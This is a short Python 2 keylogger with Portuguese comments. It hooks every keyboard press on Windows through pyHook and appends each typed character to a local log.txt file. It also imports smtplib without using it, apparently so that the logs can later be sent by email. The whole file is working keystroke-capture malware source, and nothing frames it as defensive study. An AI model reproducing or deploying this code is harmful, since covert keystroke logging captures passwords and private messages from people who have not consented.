#necessário python 2.x

#pythoncom pra fazer o looping infinito e o programa rodar até que outra tecla seja pressionada
#pyHook pra registrar as teclas
import pythoncom, pyHook, smtplib

def registrarTecla(evento):
    arquivo = open("log.txt", "a")

    teclas = chr(evento.Ascii) #devolve o caractere correspondente ao código numérico na tabela ascii
    arquivo.write(teclas) #escreve no arquivo as teclas pressionadas

hook = pyHook.HookManager()
hook.KeyDown = registrarTecla #toda vez que uma tecla for pressionada "hook.KeyDown" será registrada
hook.HookKeyboard()
pythoncom.PumpMessages() #roda o programa até que outra tecla seja pressionada, cria um looping
